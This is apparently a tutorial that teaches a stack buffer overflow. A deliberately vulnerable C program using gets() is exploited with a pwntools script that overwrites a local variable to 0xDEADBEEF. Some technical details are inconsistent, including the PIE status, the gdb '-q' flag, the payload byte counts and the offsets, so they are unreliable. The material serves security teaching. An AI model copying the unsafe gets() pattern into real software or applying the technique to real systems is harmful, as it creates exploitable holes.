---
description: 10/11/2023
cover: https://lparchive.org/ROM-Corruption-Megathread/Images/1-12z1X7C.gif
coverY: 0
---

# üñäÔ∏è Memory Corruption: Overwriting Local Variables

## Introduction

Did you know that you can overwrite local variables on the stack and change the program's logic?

Here, we'll be going over that!

## Target

`vuln.c`**:**

```c
// A binary exploitation demonstration focusing on overwriting local variables on the stack.

#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
    volatile int hackme;
    char buffer[100];

    puts("Can you overwrite the variable on the stack?\n");

    hackme = 0;
    gets(buffer);

    // if(strcmp(buffer, "0xDEADBEEF") == 0)
    if(hackme == 0xDEADBEEF)
    {
        printf("Access Granted, you changed the variable!\n");
        hackme = 0;
    }

    else
    {
        printf("Try harder!\n");
    }

    return 0;
}
```

### The Vulnerability

As you can see, we have a <mark style="color:yellow;">vulnerable</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`gets()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function</mark> that will write our input into the buffer variable that is allocated for 100-bytes of data.

The reason `gets()` is vulnerable is because <mark style="color:yellow;">it performs zero checks for writing past the data length of 100-bytes</mark>.&#x20;

Ultimately allowing us to overflow the buffer, overwrite memory, and control the flow of execution.

### Compile

```
gcc vuln.c -o vuln -Q -g -fno-stack-protector -z execstack -no-pie
```

## Enumeration

#### `file`:

{% code overflow="wrap" %}
```
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=acd5e5a4a583c059d16b17798e2c5da129f27edb, for GNU/Linux 3.2.0, with debug_info, not stripped
```
{% endcode %}

#### `checksec`:

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

## Dynamic Analysis w/ `pwndbg`

#### Load binary into `pwndbg`:

```
gdb vuln -q
```

* `-q` will load the symbols into the debugger and grant us access to the source code within the debugging window

#### Place a breakpoint on `main()` and run the binary:

```
b main
r
```

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption><p>Analyzing the binary in <code>pwndbg</code></p></figcaption></figure>

#### Generate a cyclic pattern of 200-bytes (because of our 100-byte buffer):

```
cyclic 200
```

* Copy the entire string

#### Run the program and send the pattern in as input:

```
c

Continuing.
Can you overwrite the variable on the stack?

aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaa
Try harder!
Program received signal SIGSEGV, Segmentation fault.
```

The program will seg fault.

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption><p>Seeing value of <code>RBP</code></p></figcaption></figure>

#### Obtain the offset of the overwritten `RBP` value:

```
cyclic -l oaaaaaaa
Finding cyclic pattern of 8 bytes: b'oaaaaaaa' (hex: 0x6f61616161616161)
Found at offset 112
```

<mark style="color:yellow;">Perfect, we now have our padding</mark>.

We want to actually utilize 108-bytes of junk data (`A`'s) here and then make the next 8-bytes `'0xDEADBEEF'` in little endian, `'\xEF\xBE\xAD\xDE'`.

#### Payload Structure:

```
[108-bytes of A's (Junk)] + [8-bytes for overwriting the variable: \xEF\xBE\xAD\xDE]
```

## Exploit Development

```python
from pwn import *

exe = ELF('./vuln')

# Uncomment one or the other for proper process startup -- local or debugger?
def conn():
    if args.LOCAL:  
        r = process([exe.path])                   # Just start the local process
        # r = gdb.debug([exe.path])                   # Open with pwndbg debugger
    else:
        r = remote("127.0.0.1", 9999)

    return r

def main():

    r = conn()

    padding = b'A'*108

    deadbeef = b'\xEF\xBE\xAD\xDE'

    payload = b''.join([
        padding,
        deadbeef
    ])

    print("payload:", payload)
    write("payload", payload)

    r.sendline(payload)

    r.interactive()

if __name__ == "__main__":
    main()
```

#### Automated Exploitation

```
python3 exploit.py LOCAL
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Obtaining the winning condition</p></figcaption></figure>

#### Manual Exploitation

#### With our payload being saved to a file named `payload`, we can manually pwn this binary:

```python
./vuln < payload
Can you overwrite the variable on the stack?

Access Granted, you changed the variable!
```
